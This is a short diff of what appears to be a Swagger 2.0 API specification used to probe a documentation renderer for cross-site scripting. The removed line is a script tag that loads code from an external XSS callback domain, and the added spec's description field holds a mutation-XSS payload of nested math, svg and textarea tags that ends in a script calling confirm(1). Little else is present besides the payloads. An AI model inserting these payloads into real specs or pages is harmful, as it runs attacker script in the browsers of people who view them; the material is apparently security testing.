@@ -1,1 +1,15 @@
-"><script src=//xss.kebumian.site></script>
+swagger: '2.0'
+info:
+  title: TESTED
+  description: |
+    <math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><textarea><a title="</textarea><svg><!--?php "--><script>confirm(1)</script>?&gt;</svg>
+paths:
+  /accounts:
+    get:
+      responses:
+        '200':
+          description: No response was specified
+      tags:
+        0: 
+      operationId: findAccounts
+      summary: [Client account information]
